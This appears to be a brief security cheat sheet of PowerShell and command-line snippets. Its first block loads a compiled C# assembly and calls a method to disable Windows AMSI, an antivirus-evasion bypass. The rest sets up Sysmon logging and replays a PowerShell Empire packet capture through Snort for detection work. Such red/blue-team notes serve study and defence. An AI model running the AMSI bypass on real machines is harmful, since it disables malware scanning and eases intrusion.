
#Bypass Defender AV AMSI.dll

Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
[BP.AMS]::Disable()


#detect powershell using sysmon and wazuh

Sysmon64.exe -accepteula -i sysconfig.xml

##############snort3##########
#analyze pcap with snort
snort -c /usr/local/etc/snort/snort.lua -r /home/sysadmin/pcap/http_powershell_empire.pcap -Acmg -k none -q # check packets processing by snort.
